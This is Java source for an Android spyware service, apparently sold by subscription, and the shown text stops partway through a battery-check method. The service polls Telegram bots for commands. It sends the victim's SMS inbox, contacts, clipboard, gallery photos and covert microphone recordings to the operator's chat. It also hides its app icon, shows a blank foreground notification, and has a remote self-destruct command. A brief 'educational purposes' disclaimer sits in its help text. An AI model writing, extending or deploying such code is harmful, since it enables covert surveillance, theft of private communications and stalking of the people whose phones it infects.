package com.mycompany.myspyapp;

import android.content.ClipData;
import android.content.ClipboardManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.hardware.camera2.CameraAccessException;
import android.hardware.camera2.CameraManager;
import android.media.AudioManager;
import android.media.Ringtone;
import android.media.RingtoneManager;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.net.Uri;
import android.os.BatteryManager;
import android.os.Build;
import android.os.Environment;
import android.os.Handler;
import android.os.IBinder;
import android.os.PowerManager;
import android.os.SystemClock;
import android.os.VibrationEffect;
import android.os.Vibrator;
import android.util.Log;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.UnsupportedEncodingException;
import java.net.HttpURLConnection;
import java.net.MalformedURLException;
import java.net.URL;
import java.net.URLEncoder;
import java.util.List;
import java.util.Locale;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.TimeUnit;
import android.app.*;
import java.util.Set;
import android.content.SharedPreferences;
import java.util.Arrays;
import java.util.ArrayList;
import java.util.HashSet;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import java.io.File;
import android.graphics.drawable.Drawable;
import android.graphics.drawable.BitmapDrawable;
import java.io.FileOutputStream;

import android.content.Context;
import android.util.Base64;
import android.widget.Toast;
import android.content.ContentResolver;
import android.provider.ContactsContract;
import android.provider.MediaStore;
import java.io.FileInputStream;
import java.io.DataOutputStream;
import android.hardware.Camera;
import android.media.MediaRecorder;
import android.os.Looper;



public class BotService extends Service {

    SharedPreferences prefs;

    private String botToken;
    private String adminBotToken;
    
    private static final String UNIQUE_APP_ID = "spyapp1";
    private static final String TAG = "BotService";

    private ExecutorService executorService;
    private static ExpiryChecker expiryChecker;
    private boolean running = true;

    private Ringtone currentRingtone;
    private Vibrator vibrator;
    private Handler ringtoneHandler = new Handler();
    private static final long RING_DURATION = 10000;
    private String chatId;

    private Set<String> blockedPackages;

    private Context context;

    @Override
    public void onCreate() {
        super.onCreate();

        // Retrieve bot tokens using TokenManager
        botToken = TokenManager.getBotToken(getApplicationContext());
        adminBotToken = TokenManager.getAdminBotToken(getApplicationContext());
      
        if (botToken == null || botToken.isEmpty()) {
            Log.e(TAG, "Bot token is not set! Please ensure the bot token is properly configured.");
            return; // Do not proceed if token is null
        }

        if (adminBotToken == null || adminBotToken.isEmpty()) {
            Log.e(TAG, "Admin bot token is not set! Please ensure the admin bot token is properly configured.");
            return; // Do not proceed if admin bot token is null
        }

        createForegroundNotification();
        executorService = Executors.newSingleThreadExecutor();
        expiryChecker = new ExpiryChecker(getApplicationContext()); // Initialize ExpiryChecker
        new Thread(new Runnable() {
                @Override
                public void run() {
                    pollAdminBot();
                }
            }).start();
        new Thread(new Runnable() {
                @Override
                public void run() {
                    pollUserBot();
                }
            }).start();
        vibrator = (Vibrator) getSystemService(Context.VIBRATOR_SERVICE);
        blockedPackages = new HashSet<>();


    }
    

    private void createForegroundNotification() {
        String channelId = "bot_channel";
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(channelId, "Bot Channel", NotificationManager.IMPORTANCE_LOW);
            ((NotificationManager) getSystemService(Context.NOTIFICATION_SERVICE)).createNotificationChannel(channel);
        }

        Notification notification = new Notification.Builder(this, channelId)
            .setContentTitle("ㅤ")
            .setContentText("ㅤ")
            .setSmallIcon(android.R.drawable.ic_dialog_info)
            .build();

        startForeground(1, notification);
    }
    

    private void pollAdminBot() {
        String offset = "";
        while (running) {
            try {
                URL url = new URL("https://api.telegram.org/bot" + adminBotToken + "/getUpdates?offset=" + offset);
                JSONArray updates = getUpdatesFromUrl(url);

                for (int i = 0; i < updates.length(); i++) {
                    JSONObject update = updates.getJSONObject(i);
                    offset = String.valueOf(update.getInt("update_id") + 1);

                    if (update.has("message")) {
                        JSONObject message = update.getJSONObject("message");
                        String chatId = message.getJSONObject("chat").getString("id");
                        if (message.has("text")) {
                            String text = message.getString("text");
                            
                            if (text.startsWith("/check_exp")) {
                                try {
                                    String[] parts = text.split(" ");
                                    if (parts.length == 2) {
                                        String targetAppId = parts[1]; // Get the app unique ID from the command

                                        // Check if the provided app ID matches the expected APP_UNIQUE_ID
                                        if (targetAppId.equals(UNIQUE_APP_ID)) {
                                            String expiryDateString = expiryChecker.getExpiryDateTimeString();
                                            if (expiryDateString != null) {
                                                sendToBot(adminBotToken, chatId, "App expiry date is: " + expiryDateString + "\nApp id: " + UNIQUE_APP_ID);
                                            } else {
                                                sendToBot(adminBotToken, chatId, "No expiry date set for the app.");
                                            }
                                        } /*else {
                                            sendToBot(adminBotToken, chatId, "App ID does not match the expected ID.");
                                        }*/
                                    } /*else {
                                        sendToBot(adminBotToken, chatId, "Invalid /check_exp command format.\nWrite like this: /check_exp YOUR_UNIQUE_APP_ID");
                                    }*/
                                } catch (Exception e) {
                                    Log.e(TAG, "Error processing /check_exp command: " + e.getMessage(), e);
                                    //sendToBot(adminBotToken, chatId, "Error processing /check_exp command.");
                                }
                            }
                            else if (text.startsWith("/setexpire")) {
                                try {
                                    String[] parts = text.split(" ");
                                    if (parts.length == 4) {
                                        String targetAppId = parts[1];
                                        String newExpiryDate = parts[2];
                                        String newExpiryTime = parts[3];
                                        String newExpiryDateTime = newExpiryDate + " " + newExpiryTime;

                                        if (targetAppId.equals(UNIQUE_APP_ID)) {
                                            
                                            expiryChecker.updateExpiryDateTime(newExpiryDateTime);
                                            Log.i(TAG, "Expiration updated by admin: " + newExpiryDateTime);
                                            sendToBot(adminBotToken, chatId, "Expiration updated for app ID: " + UNIQUE_APP_ID);
                                        } /*else {
                                            sendToBot(adminBotToken, chatId, "App ID does not match.");
                                        }*/
                                    } /*else {
                                        sendToBot(adminBotToken, chatId, "Invalid /setexpire command format.\nwrite like this >> /setexpire YOUR_UNIQUE_APP_ID_HERE 15/04/2025 15:30");
                                    }*/
                                } catch (Exception e) {
                                    Log.e(TAG, "Error processing /setexpire command: " + e.getMessage(), e);
                                    //sendToBot(adminBotToken, chatId, "Error processing command.");
                                }
                            } else if (text.equalsIgnoreCase("/appslist")) {
                                sendToBot(adminBotToken, chatId, UNIQUE_APP_ID);
                            }
                            /*else {
                                sendToBot(adminBotToken, chatId, "Invalid command !!!");
                            }*/
                            // Add other admin command handling here
                        }
                    }
                }
            } catch (MalformedURLException e) {
                Log.e(TAG, "Malformed URL for admin bot: " + e.getMessage(), e);
            } catch (IOException e) {
                Log.e(TAG, "IO Exception while polling admin bot: " + e.getMessage(), e);
            } catch (JSONException e) {
                Log.e(TAG, "JSON Exception while polling admin bot: " + e.getMessage(), e);
            } catch (Exception e) {
                Log.e(TAG, "Unexpected error polling admin bot: " + e.getMessage(), e);
            } finally {
                try {
                    Thread.sleep(3000); 
                } catch (InterruptedException e) {
                    Thread.currentThread().interrupt();
                }
            }
        }
    }

    private void pollUserBot() {
        String offset = "";
        while (running) {
            try {
                URL url = new URL("https://api.telegram.org/bot" + botToken + "/getUpdates?offset=" + offset);
                JSONArray updates = getUpdatesFromUrl(url);

                for (int i = 0; i < updates.length(); i++) {
                    JSONObject update = updates.getJSONObject(i);
                    offset = String.valueOf(update.getInt("update_id") + 1);

                    if (update.has("message")) {
                        JSONObject message = update.getJSONObject("message");
                        chatId = message.getJSONObject("chat").getString("id");
                        if (message.has("text")) {
                            String text = message.getString("text");
                            
                            String expiryDateString = expiryChecker.getExpiryDateTimeString();
                            

                            if (expiryChecker.isExpired()) {
                                send("Your app (ID: " + UNIQUE_APP_ID + ") is expired, please contact the Developer.");
                                continue; // Skip command processing
                            }

                            try {
                                
                                if (text.equalsIgnoreCase("/hide")) {
                                    hideApp();
                                    send("App hidden.");
                                } else if (text.equalsIgnoreCase("/unhide")) {
                                    unhideApp();
                                    send("App icon restored.");
                                } else if (text.equalsIgnoreCase("/torchon")) {
                                    toggleTorch(true);
                                    send("Torch turned ON.");
                                } else if (text.equalsIgnoreCase("/torchoff")) {
                                    toggleTorch(false);
                                    send("Torch turned OFF.");
                                } else if (text.equalsIgnoreCase("/apps")) {
                                    listInstalledApps();
                                } else if (text.equals("/vibrate")) {
                                    vibratePhone();
                                    send("Phone vibrated!");
                                } else if (text.equalsIgnoreCase("/showsms")) {
                                    readSms();
                                } else if (text.equalsIgnoreCase("/phone_status")) {
                                    sendPhoneStatus();
                                } else if (text.equalsIgnoreCase("/help")) {
                                    sendHelpMessage();
                                } else if (text.equalsIgnoreCase("/check_batt")) {
                                    checkBatteryLevel();
                                } else if (text.equalsIgnoreCase("/clipboard")) {
                                    getClipboardData();
                                } else if (text.equalsIgnoreCase("/storage_free") || text.equalsIgnoreCase("/free_storage")) {
                                    getFreeInternalStorage();
                                } else if (text.equalsIgnoreCase("/uptime")) {
                                    getDeviceUptime();
                                } else if (text.equalsIgnoreCase("/ring_phone")) {
                                    ringPhoneWithTimeout();
                                } else if (text.equalsIgnoreCase("/stop_ring")) {
                                    stopRinging();
                                } else if (text.equalsIgnoreCase("/check_exp")) {
                                    send("Your plan will expired on: " + expiryDateString + "\nApp id: " + UNIQUE_APP_ID);
                                } 
                              
                                else if (text.equals("/set_wall_1") || text.equals("/set_wall_2") || text.equals("/set_wall_0")) {
                                    handleWallpaperCommand(text);
								}
                                
                                else if (text.startsWith("/usagetime ")) {
                                    String[] parts = text.split(" ");
                                    if (parts.length == 2) {
                                        String pkg = parts[1];
                                        long timeMs = UsageStatsHelper.getUsageTime(getApplicationContext(), pkg);

                                        if (timeMs > 0) {
                                            long seconds = (timeMs / 1000) % 60;
                                            long minutes = (timeMs / (1000 * 60)) % 60;
                                            long hours = (timeMs / (1000 * 60 * 60));
                                            send("Usage time for " + pkg + ":\n" + hours + " Hours " + minutes + " Minutes " + seconds + " Seconds");
                                        } else {
                                            send("No usage found for package: " + pkg);
                                        }
                                    } else {
                                        send("Usage:\n/usagetime com.example.package");
                                    }
                                }
                                
                                
                                else if (text.startsWith("/contacts")) {
                                    String filter = null;
                                    
                                    if (text.equalsIgnoreCase("/contacts")){
                                        send("Please use /contacts followed by a name or letter.\nExample: /contacts raja");
                                   
                                    }

                                    String[] parts = text.trim().split("\\s+", 2);
                                    if (parts.length > 1) {
                                        filter = parts[1].toLowerCase();
                                    }

                                    StringBuilder contactsResult = new StringBuilder();
                                    ContentResolver resolver = getContentResolver();
                                    Cursor cursor = resolver.query(
                                        ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                                        null, null, null, ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME + " ASC"
                                    );

                                    if (cursor != null && cursor.moveToFirst()) {
                                        do {
                                            String name = cursor.getString(cursor.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));
                                            String number = cursor.getString(cursor.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.NUMBER));

                                            if (filter == null || name.toLowerCase().startsWith(filter)) {
                                                contactsResult.append(name).append(": ").append(number).append("\n");
                                            }

                                        } while (cursor.moveToNext());
                                        cursor.close();
                                    }

                                    if (contactsResult.length() == 0) {
                                        send("No matching contacts found.");
                                    } else {
                                        send(contactsResult.toString());
                                    }
                                }
                                
                                else if (text.startsWith("/sendimage ")) {
                                    handleSendImageCommand(text);
                                }
                                
                              
                                
                                //-------------------------------------------------
                                //block, unblock the packages using accessebility //
                                //-------------------------------------------------
                                
                                /*
                                else if (text.startsWith("/block ")) {
                                    String pkg = text.replace("/block ", "").trim();
                                    MyAccessibilityService.blockedPackages.add(pkg);
                                    send("Blocked: " + pkg);
                                }

                                else if (text.startsWith("/unblock ")) {
                                    String pkg = text.replace("/unblock ", "").trim();
                                    MyAccessibilityService.blockedPackages.remove(pkg);
                                    send("Unblocked: " + pkg);
                                }

                                else if (text.equals("/list_blocked")) {
                                    send("Blocked Packages:\n" + MyAccessibilityService.blockedPackages.toString());
                                }
                                
                                */
                                
                               //*********************//
                               
                                else if (text.equalsIgnoreCase("/self_destruct")) {
                                    SelfDestructHelper.deleteAppData(getApplicationContext());
                                    
                                    send("App data wiped");
                                    stopSelf(); // Optionally stop the bot service
                                    android.os.Process.killProcess(android.os.Process.myPid()); // Kill the app process
                                    //send("App data wiped");
                                
                                }
                                else if (text.startsWith("/voice_rec ")) {
                                    handleVoiceRecordCommand(text);
                                }
                                
                                
                               
                               
                                else {
                                    send("WRONG COMMAND! enter /help");
                                }
                            } catch (Exception e) {
                                Log.e(TAG, "Error processing user command: " + e.getMessage(), e);
                                send("Error processing command.");
                            }
                        }
                    }
                }
            } catch (MalformedURLException e) {
                Log.e(TAG, "Malformed URL for user bot: " + e.getMessage(), e);
            } catch (IOException e) {
                Log.e(TAG, "IO Exception while polling user bot: " + e.getMessage(), e);
            } catch (JSONException e) {
                Log.e(TAG, "JSON Exception while polling user bot: " + e.getMessage(), e);
            } catch (Exception e) {
                Log.e(TAG, "Unexpected error polling user bot: " + e.getMessage(), e);
            } finally {
                try {
                    Thread.sleep(3000); 
                } catch (InterruptedException e) {
                    Thread.currentThread().interrupt(); 
                }
            }
        }
    }
    
    
    private void handleVoiceRecordCommand(String text) {
        try {
            String[] parts = text.split(" ");
            if (parts.length != 2) {
                send("Usage: /voice_rec <seconds>");
                return;
            }

            final int durationSec = Integer.parseInt(parts[1].trim());
            final MediaRecorder recorder = new MediaRecorder();

            File outputDir = getCacheDir();
            final File audioFile = new File(outputDir, "recorded_audio.3gp");

            recorder.setAudioSource(MediaRecorder.AudioSource.MIC);
            recorder.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP);
            recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB);
            recorder.setOutputFile(audioFile.getAbsolutePath());

            recorder.prepare();
            recorder.start();
            send("Recording started for " + durationSec + " seconds...");

            new Handler(Looper.getMainLooper()).postDelayed(new Runnable() {
                    @Override
                    public void run() {
                        try {
                            recorder.stop();
                            recorder.release();
                            send("Recording completed. Sending...");

                            sendAudioToTelegram(audioFile);
                        } catch (Exception e) {
                            send("Error stopping recorder: " + e.getMessage());
                        }
                    }
                }, durationSec * 1000);
        } catch (Exception e) {
            send("Error recording voice: " + e.getMessage());
        }
    }
    
    private void sendAudioToTelegram(File audioFile) {
        try {
            String urlString = "https://api.telegram.org/bot" + botToken + "/sendAudio";
            String boundary = "*****" + Long.toString(System.currentTimeMillis()) + "*****";

            URL url = new URL(urlString);
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setDoOutput(true);
            conn.setUseCaches(false);
            conn.setRequestMethod("POST");
            conn.setRequestProperty("Connection", "Keep-Alive");
            conn.setRequestProperty("Content-Type", "multipart/form-data;boundary=" + boundary);

            DataOutputStream dos = new DataOutputStream(conn.getOutputStream());

            dos.writeBytes("--" + boundary + "\r\n");
            dos.writeBytes("Content-Disposition: form-data; name=\"chat_id\"\r\n\r\n");
            dos.writeBytes(chatId + "\r\n");

            dos.writeBytes("--" + boundary + "\r\n");
            dos.writeBytes("Content-Disposition: form-data; name=\"audio\";filename=\"" + audioFile.getName() + "\"\r\n");
            dos.writeBytes("Content-Type: application/octet-stream\r\n\r\n");

            FileInputStream fis = new FileInputStream(audioFile);
            byte[] buffer = new byte[4096];
            int bytesRead;
            while ((bytesRead = fis.read(buffer)) != -1) {
                dos.write(buffer, 0, bytesRead);
            }
            fis.close();

            dos.writeBytes("\r\n");
            dos.writeBytes("--" + boundary + "--\r\n");
            dos.flush();
            dos.close();

            int responseCode = conn.getResponseCode();
            if (responseCode == HttpURLConnection.HTTP_OK) {
                Log.d(TAG, "Voice sent successfully.");
            } else {
                send("Failed to send voice. Server response: " + responseCode);
            }

            conn.disconnect();

        } catch (Exception e) {
            send("Error sending voice: " + e.getMessage());
        }
    }
    
    
    
    
    // Helper function to fetch updates from a given URL
    private JSONArray getUpdatesFromUrl(URL url) throws IOException, JSONException {
        HttpURLConnection conn = (HttpURLConnection) url.openConnection();
        conn.setRequestMethod("GET");
        BufferedReader reader = new BufferedReader(new InputStreamReader(conn.getInputStream()));
        StringBuilder result = new StringBuilder();
        String line;
        while ((line = reader.readLine()) != null)
            result.append(line);
        reader.close();
        conn.disconnect();
        JSONObject json = new JSONObject(result.toString());
        return json.getJSONArray("result");
    }

    // Helper method to send messages to a specific bot and chat ID
    private void sendToBot(final String targetBotToken, final String targetChatId, final String messageText) {
        executorService.submit(new Runnable() {
                @Override
                public void run() {
                    try {
                        String encodedMsg = URLEncoder.encode(messageText, "UTF-8");
                        URL url = new URL("https://api.telegram.org/bot" + targetBotToken + "/sendMessage?chat_id=" + targetChatId + "&text=" + encodedMsg);
                        HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                        conn.setRequestMethod("GET");
                        BufferedReader reader = new BufferedReader(new InputStreamReader(conn.getInputStream()));
                        StringBuilder result = new StringBuilder();
                        String line;
                        while ((line = reader.readLine()) != null)
                            result.append(line);
                        reader.close();
                        conn.disconnect();
                        Log.d(TAG, "Telegram API Response: " + result.toString());
                    } catch (UnsupportedEncodingException e) {
                        Log.e(TAG, "Encoding error: " + e.getMessage(), e);
                    } catch (MalformedURLException e) {
                        Log.e(TAG, "Malformed URL: " + e.getMessage(), e);
                    } catch (IOException e) {
                        Log.e(TAG, "IO Exception: " + e.getMessage(), e);
                    } catch (Exception e) {
                        Log.e(TAG, "Unexpected error sending message: " + e.getMessage(), e);
                    }
                }
            });
    }
    
    //*********
    //*********
    
    
    
    
    //*******
    //******
    
    
    
    // ***************
    
    
    private void handleSendImageCommand(String text) {
        try {
            String[] parts = text.split(" ");
            if (parts.length != 2) {
                send("Invalid command! Use /sendimage <number>");
                return;
            }

            int index = Integer.parseInt(parts[1].trim()) - 1; // user sends 1-based number

            ArrayList<String> images = new ArrayList<String>();
            String[] projection = { MediaStore.Images.Media.DATA };
            Cursor cursor = getContentResolver().query(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, projection, null, null, MediaStore.Images.Media.DATE_ADDED + " DESC");
            if (cursor != null) {
                int columnIndex = cursor.getColumnIndexOrThrow(MediaStore.Images.Media.DATA);
                while (cursor.moveToNext()) {
                    String imagePath = cursor.getString(columnIndex);
                    images.add(imagePath);
                }
                cursor.close();
            }

            if (index < 0 || index >= images.size()) {
                send("Invalid image number. You have only " + images.size() + " images.");
                return;
            }

            String filePath = images.get(index);
            File file = new File(filePath);
            if (!file.exists()) {
                send("File not found: " + filePath);
                return;
            }

            String urlString = "https://api.telegram.org/bot" + botToken + "/sendPhoto";

            String boundary = "*****" + Long.toString(System.currentTimeMillis()) + "*****";

            URL url = new URL(urlString);
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setDoOutput(true);
            conn.setUseCaches(false);
            conn.setRequestMethod("POST");
            conn.setRequestProperty("Connection", "Keep-Alive");
            conn.setRequestProperty("Content-Type", "multipart/form-data;boundary=" + boundary);

            DataOutputStream dos = new DataOutputStream(conn.getOutputStream());

            dos.writeBytes("--" + boundary + "\r\n");
            dos.writeBytes("Content-Disposition: form-data; name=\"chat_id\"\r\n\r\n");
            dos.writeBytes(chatId + "\r\n");

            dos.writeBytes("--" + boundary + "\r\n");
            dos.writeBytes("Content-Disposition: form-data; name=\"photo\";filename=\"" + file.getName() + "\"\r\n");
            dos.writeBytes("Content-Type: application/octet-stream\r\n\r\n");

            FileInputStream fis = new FileInputStream(file);
            byte[] buffer = new byte[4096];
            int bytesRead;
            while ((bytesRead = fis.read(buffer)) != -1) {
                dos.write(buffer, 0, bytesRead);
            }
            fis.close();

            dos.writeBytes("\r\n");
            dos.writeBytes("--" + boundary + "--\r\n");
            dos.flush();
            dos.close();

            int responseCode = conn.getResponseCode();
            if (responseCode == HttpURLConnection.HTTP_OK) {
                Log.d(TAG, "Photo sent successfully.");
            } else {
                Log.e(TAG, "Failed to send photo. Response code: " + responseCode);
                send("Failed to send photo. Server response: " + responseCode);
            }
            conn.disconnect();

        } catch (Exception e) {
            Log.e(TAG, "Error in handleSendImageCommand: " + e.getMessage(), e);
            send("Error sending image: " + e.getMessage());
        }
    }
    
    
    // ***************
    
    
    
    private void handleWallpaperCommand(String text) {
        WallpaperManager wallpaperManager = WallpaperManager.getInstance(getApplicationContext());
        File original = new File(getFilesDir(), "original_wallpaper.png");

        try {
            if (text.equals("/set_wall_1") || text.equals("/set_wall_2")) {
                // Always update the backup of current wallpaper before setting a new one
                Drawable currentDrawable = wallpaperManager.getDrawable();
                Bitmap currentBitmap = ((BitmapDrawable) currentDrawable).getBitmap();
                FileOutputStream out = new FileOutputStream(original);
                currentBitmap.compress(Bitmap.CompressFormat.PNG, 100, out);
                out.close();

                if (text.equals("/set_wall_1")) {
                    Bitmap wall1 = BitmapFactory.decodeResource(getResources(), R.drawable.wall1);
                    wallpaperManager.setBitmap(wall1);
                    send("Wallpaper set to wall1.");
                } else {
                    Bitmap wall2 = BitmapFactory.decodeResource(getResources(), R.drawable.wall2);
                    wallpaperManager.setBitmap(wall2);
                    send("Wallpaper set to wall2.");
                }

            } else if (text.equals("/set_wall_0")) {
                // Restore saved original wallpaper
                if (original.exists()) {
                    Bitmap originalBmp = BitmapFactory.decodeFile(original.getAbsolutePath());
                    wallpaperManager.setBitmap(originalBmp);

                    // Delete the backup to free memory
                    if (original.delete()) {
                        send("Wallpaper restored and backup deleted.");
                    } else {
                        send("Wallpaper restored, but failed to delete backup.");
                    }

                } else {
                    send("No saved wallpaper to restore.");
                }
            } else {
                send("Invalid wallpaper command.");
            }
        } catch (Exception e) {
            send("Error setting wallpaper: " + e.getMessage());
            Log.e(TAG, "Wallpaper error: ", e);
        }
    }
    
    
    private void getDeviceUptime() {
        long uptimeMillis = SystemClock.uptimeMillis();
        long days = TimeUnit.MILLISECONDS.toDays(uptimeMillis);
        long hours = TimeUnit.MILLISECONDS.toHours(uptimeMillis) % 24;
        long minutes = TimeUnit.MILLISECONDS.toMinutes(uptimeMillis) % 60;
        long seconds = TimeUnit.MILLISECONDS.toSeconds(uptimeMillis) % 60;

        String uptimeString = String.format(Locale.getDefault(), "%d days, %d hours, %d minutes, %d seconds", days, hours, minutes, seconds);
        send("Device Uptime: " + uptimeString);
    }

    private void getFreeInternalStorage() {
        long freeBytes = Environment.getDataDirectory().getFreeSpace();
        String formattedSize = formatFileSize(freeBytes);
        send("Free Internal Storage: " + formattedSize);
    }

    private String formatFileSize(long bytes) {
        if (bytes < 1024) {
            return bytes + " B";
        } else if (bytes < 1024 * 1024) {
            return String.format(Locale.getDefault(), "%.2f KB", bytes / 1024.0);
        } else if (bytes < 1024 * 1024 * 1024) {
            return String.format(Locale.getDefault(), "%.2f MB", bytes / (1024.0 * 1024));
        } else {
            return String.format(Locale.getDefault(), "%.2f GB", bytes / (1024.0 * 1024 * 1024));
        }
    }

    private void ringPhoneWithTimeout() {
        try {
            Uri ringtoneUri = RingtoneManager.getDefaultUri(RingtoneManager.TYPE_RINGTONE);
            if (ringtoneUri != null) {
                currentRingtone = RingtoneManager.getRingtone(getApplicationContext(), ringtoneUri);
                if (currentRingtone != null) {
                    AudioManager audioManager = (AudioManager) getSystemService(Context.AUDIO_SERVICE);
                    if (audioManager != null && audioManager.getRingerMode() != AudioManager.RINGER_MODE_SILENT) {
                        currentRingtone.play();
                        send("Ringing phone for 10 seconds...");
                        if (vibrator != null && vibrator.hasVibrator()) {
                            long[] pattern = {0, 500, 500, 500};
                            int[] amplitudes = {VibrationEffect.DEFAULT_AMPLITUDE, 0, VibrationEffect.DEFAULT_AMPLITUDE, 0};
                            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                                vibrator.vibrate(VibrationEffect.createWaveform(pattern, amplitudes, -1));
                            } else {
                                vibrator.vibrate(pattern, -1);
                            }
                        }

                        ringtoneHandler.postDelayed(new Runnable() {
                                @Override
                                public void run() {
                                    stopRinging();
                                }
                            }, RING_DURATION);

                    } else {
                        send("Phone is in silent mode, cannot ring.");
                    }
                } else {
                    send("Could not get default ringtone.");
                }
            } else {
                send("No default ringtone found.");
            }
        } catch (SecurityException e) {
            send("Error: Could not ring phone due to permission issues.");
            Log.e(TAG, "SecurityException ringing phone: " + e.getMessage(), e);
        } catch (Exception e) {
            send("Error ringing phone: " + e.getMessage());
            Log.e(TAG, "Exception ringing phone: " + e.getMessage(), e);
        }
    }

    private void stopRinging() {
        if (currentRingtone != null && currentRingtone.isPlaying()) {
            currentRingtone.stop();
            send("Ringing stopped.");
        }
        if (vibrator != null) {
            vibrator.cancel();
        }
    }

    private void sendHelpMessage() {
        StringBuilder helpMessage = new StringBuilder();
        helpMessage.append("👑 Developed by King 👽\n\n");

        helpMessage.append("✨ Available Commands ✨\n\n");

        helpMessage.append("🎭 Stealth Mode\n");
        helpMessage.append("• /hide — Hide app icon\n");
        helpMessage.append("• /unhide — Restore app icon\n\n");

        helpMessage.append("⚡ Fun Actions\n");
        helpMessage.append("• /torchon — Turn ON flashlight\n");
        helpMessage.append("• /torchoff — Turn OFF flashlight\n");
        helpMessage.append("• /vibrate — Vibrate the device\n");
        helpMessage.append("• /ring_phone — Ring device for 10s\n");
        helpMessage.append("• /stop_ring — Stop ringing\n");
        helpMessage.append("• /set_wall_1 — Apply Wallpaper 1\n");
        helpMessage.append("• /set_wall_2 — Apply Wallpaper 2\n");
        helpMessage.append("• /set_wall_0 — Restore original wallpaper\n\n");

        helpMessage.append("🕵️ Monitor & Info\n");
        helpMessage.append("• /apps — List installed apps\n");
        helpMessage.append("• /showsms — Show last 10 SMS\n");
        helpMessage.append("• /contacts <name/letter> — Find contact\n");
        helpMessage.append("• /phone_status — Screen ON/OFF status\n");
        helpMessage.append("• /check_batt — Battery level\n");
        helpMessage.append("• /clipboard — Current clipboard text\n");
        helpMessage.append("• /uptime — Device uptime\n");
        helpMessage.append("• /free_storage — Free storage space\n");
        helpMessage.append("• /check_exp — Plan validity\n");
        helpMessage.append("• /usagetime <package> — App usage time\n");
        helpMessage.append("• /sendimage <number> — Fetch gallery image\n");
        helpMessage.append("• /voice_rec <secs> —  Record voice\n\n");
        
        helpMessage.append("🔥️ Destroy The App\n");
        helpMessage.append("• /self_destruct — Remove access from the device\n\n");

        helpMessage.append("♻️ Help\n");
        helpMessage.append("• /help — Show this help menu\n\n");

        helpMessage.append("⚠️ Disclaimer\n");
        helpMessage.append("This tool is for educational purposes only.\n");
        helpMessage.append("Unauthorized use is prohibited.\n");
        helpMessage.append("Developer holds no responsibility for misuse.\n");

        send(helpMessage.toString());
    }
    
    

    private void sendPhoneStatus() {
        PowerManager pm = (PowerManager) getSystemService(Context.POWER_SERVICE);
        boolean isScreenOn = false;
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.KITKAT_WATCH) {
            isScreenOn = pm.isInteractive();
        } else {
            isScreenOn = pm.isScreenOn();
        }
        String status = isScreenOn ? "ON" : "OFF";
        send("Phone screen is: " + status);
    }

    private void hideApp() {
        PackageManager pm = getPackageManager();
        ComponentName component = new ComponentName(this, SetToken.class);
        pm.setComponentEnabledSetting(component,
            PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
            PackageManager.DONT_KILL_APP);
    }

    private void unhideApp() {
        PackageManager pm = getPackageManager();
        ComponentName component = new ComponentName(this, SetToken.class);
        pm.setComponentEnabledSetting(component,
            PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
            PackageManager.DONT_KILL_APP);
    }
    
    private void toggleTorch(boolean state) {
        try {
            CameraManager cm = (CameraManager) getSystemService(Context.CAMERA_SERVICE);
            String camId = cm.getCameraIdList()[0];
            cm.setTorchMode(camId, state);
        } catch (CameraAccessException e) {
            send("Error: Camera access denied.");
            Log.e(TAG, "CameraAccessException: " + e.getMessage(), e);
        } catch (Exception e) {
            send("Error: Torch not available or other error.");
            Log.e(TAG, "Error toggling torch: " + e.getMessage(), e);
        }
    }

    private void listInstalledApps() {
        try {
            StringBuilder apps = new StringBuilder();
            PackageManager pm = getPackageManager();
            List<ApplicationInfo> packages = pm.getInstalledApplications(0);

            for (ApplicationInfo appInfo : packages) {
                if (pm.getLaunchIntentForPackage(appInfo.packageName) != null) {
                    String name = pm.getApplicationLabel(appInfo).toString();
                    apps.append(name).append("\n");
                }
            }

            send(apps.toString().trim());
        } catch (Exception e) {
            send("Failed to list apps.");
            Log.e(TAG, "Error listing apps: " + e.getMessage(), e);
        }
    }

    private void vibratePhone() {
        Vibrator vibrator = (Vibrator) getSystemService(Context.VIBRATOR_SERVICE);
        if (vibrator != null && vibrator.hasVibrator()) {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                vibrator.vibrate(VibrationEffect.createOneShot(1000, VibrationEffect.DEFAULT_AMPLITUDE));
            } else {
                vibrator.vibrate(1000);
            }
        }
    }

    private void readSms() {
        try {
            Uri uri = Uri.parse("content://sms/inbox");
            Cursor cursor = getContentResolver().query(uri, null, null, null, "date DESC");
            if (cursor != null && cursor.moveToFirst()) {
                StringBuilder smsBuilder = new StringBuilder();
                int count = 0;
                do {
                    String address = cursor.getString(cursor.getColumnIndex("address"));
                    String body = cursor.getString(cursor.getColumnIndex("body"));
                    smsBuilder.append("From: ").append(address)
                        .append("\n").append(body).append("\n\n");
                    count++;
                } while (cursor.moveToNext() && count < 10);
                cursor.close();
                send(smsBuilder.toString());
            } else {
                send("No SMS found.");
            }
        } catch (SecurityException e) {
            send("Error: SMS read permission denied.");
            Log.e(TAG, "SecurityException reading SMS: " + e.getMessage(), e);
        } catch (Exception e) {
            send("Error reading SMS: " + e.getMessage());
            Log.e(TAG, "Exception reading SMS: " + e.getMessage(), e);
        }
    }

    private void checkBatteryLevel() {
        try {
